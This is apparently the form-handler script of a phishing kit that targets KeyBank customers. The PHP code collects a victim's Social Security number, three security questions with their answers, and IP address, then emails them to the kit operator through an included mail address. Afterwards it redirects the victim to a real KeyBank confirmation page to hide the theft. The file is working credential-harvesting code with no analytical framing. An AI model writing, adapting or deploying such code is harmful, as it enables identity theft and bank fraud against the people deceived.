<?php

//Open Session
ini_set("output_buffering",4096);
session_start();
ob_start();

include 'Email.php';

$ip = getenv("REMOTE_ADDR");
$message .= "------------ KE DE -------------\n";
$message .= "SSN	      : ".$_POST['ssn']."\n";
$message .= "Q1	    	  : ".$_POST['q1']."\n";
$message .= "Ans1	      : ".$_POST['ans1']."\n";
$message .= "Q2	    	  : ".$_POST['q2']."\n";
$message .= "Ans2	      : ".$_POST['ans2']."\n";
$message .= "Q3	    	  : ".$_POST['q3']."\n";
$message .= "Ans3	      : ".$_POST['ans3']."\n";
$message .= "-------------------------------------\n";
$message .= "IP: $ip\n";
$message .= "---------DIAGO-ICQ:728579106--------------\n";
$subject = " KEE LO - $ip";
$headers = "From: KKEEYY<newowway@mail.com>";


mail($SEND,$subject,$message,$headers);

session_destroy();

header("Location:https://www.key.com/about/customer-service/key-bank-general-confirmation.jsp");

?>